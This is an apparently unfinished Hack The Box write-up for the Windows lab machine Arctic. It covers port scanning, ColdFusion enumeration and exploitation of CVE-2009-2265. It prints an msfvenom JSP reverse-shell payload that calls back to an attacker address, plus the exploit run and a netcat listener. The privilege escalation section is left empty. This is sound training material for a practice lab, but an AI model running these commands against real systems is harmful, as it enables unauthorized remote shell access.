# Arctic

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Arctic)  [2](https://app.hackthebox.com/machines/Arctic)

**Machine ip:** 10.10.10.11

![Arctic](https://github.com/h4md153v63n/CTFs/assets/5091265/d397feae-2a4e-407d-b89c-8be5e16dbd0c)


# Sections
+ [Reconnaissance](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/46_Arctic.md#reconnaissance)
+ x
+ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/46_Arctic.md#links)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.11 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.11 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2a63e599-4daa-4749-9bce-3fdd108a0fb8)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1fb88333-4181-436f-afa1-c5b07366bca2)


## Enumeration
Visit **http://10.10.10.11:8500/**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2d1d0c15-3bc9-4a1e-b45f-2bbfc5ab816f)

Check consecutively **http://10.10.10.11:8500/CFIDE/** -> **http://10.10.10.11:8500/CFIDE/administrator/**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3ffa0ee5-63da-4a34-802b-d94c1505c0b2)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dc394261-f2e2-4ff1-8097-2bff1c424d5e)


## Exploitation & Gaining Access

### Method 1: [CVE-2009-2265](https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py) - Without Metasploit
`searchsploit ColdFusion 8.0`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8ebb9589-7dde-449e-b246-753a5516da14)

Without metasploit, download the exploit: [CVE-2009-2265](https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/249d5d95-b6cf-4463-b08a-c0a89556408d)

Generate a **jsp** reverse shell payload with msfvenom:

```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.24 lport=4444 -f raw -o payload.jsp
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8a065239-c0c4-444b-b822-4fbb82ec1195)

Execute the exploit: `python2 upload.py 10.10.10.11 8500 payload.jsp`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/14c69e8e-c227-4fd2-8387-c2d648fb6979)

Start netcat listener: `nc -lnvp 4444`

Visit the payload on the browser: `http://10.10.10.11:8500/userfiles/file/exploit.jsp`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4742bb0b-33c5-4a3a-bcb9-7d4e30059efa)

Get the revershell, and read the user.txt flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c7c29511-3e4a-44e2-a455-cbb6fde1a4a6)


## Privilege Escalation

### Method 1: 


---

# Links

# References & Alternatives
+ https://vvmlist.github.io/#Arctic
+ https://0xdf.gitlab.io/2020/05/19/htb-arctic.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/arctic-writeup-w-o-metasploit
+ 


## CVE Scripting
+ **CVE-2009-2265:**
  + https://github.com/c0d3cr4f73r/CVE-2009-2265/tree/main
    + https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py


## Tools
+ x 


## Technical Knowledge
+ x 


## Problems Solution
+ x 


## For More
+ x 

